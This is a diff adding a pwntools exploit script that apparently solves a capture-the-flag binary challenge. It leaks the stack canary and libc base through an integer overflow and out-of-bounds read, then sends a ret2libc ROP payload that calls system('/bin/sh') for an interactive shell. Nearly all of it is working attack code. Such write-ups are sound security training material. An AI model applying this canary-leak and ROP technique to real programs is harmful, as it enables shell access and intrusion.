@@ -1,0 +1,56 @@
+from pwn import *
+
+# use interger overflow and out of bound to leak canary and libc base, then ret2libc
+# note: canary cua moi ham la nhu nhau trong 1 lan execute file -> leak canary cua 1 ham = canary cua toan bo file
+
+p = process("./chal_patched")
+e = ELF("./chal_patched")
+libc = ELF("./libc.so.6")
+
+'''
+p = gdb.debug("./chal_patched", gdbscript = 
+breakrva 0x18F5
+breakrva 0x19B9
+r
+)
+'''
+
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"3")
+
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"7")
+p.recvuntil(b"for ")
+s = p.recvline()
+canary = int(s.decode().split()[0])
+print("canary: ", hex(canary))
+
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"> ", b"17")
+p.recvuntil(b"for ")
+s = p.recvline()
+libc_base = int(s.decode().split()[0]) - 2510912
+print("libc_base: ", hex(libc_base))
+
+pop_rdi = libc_base + 0x000000000002a3e5
+ret = pop_rdi + 1
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
+
+p.sendlineafter(b"> ", b"3")
+payload = b'A' * 0x68 + p64(canary) + b'B' * 0x8
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(ret) # stack align
+payload += p64(system)
+p.sendafter(b"share: \n", payload)
+
+p.interactive()
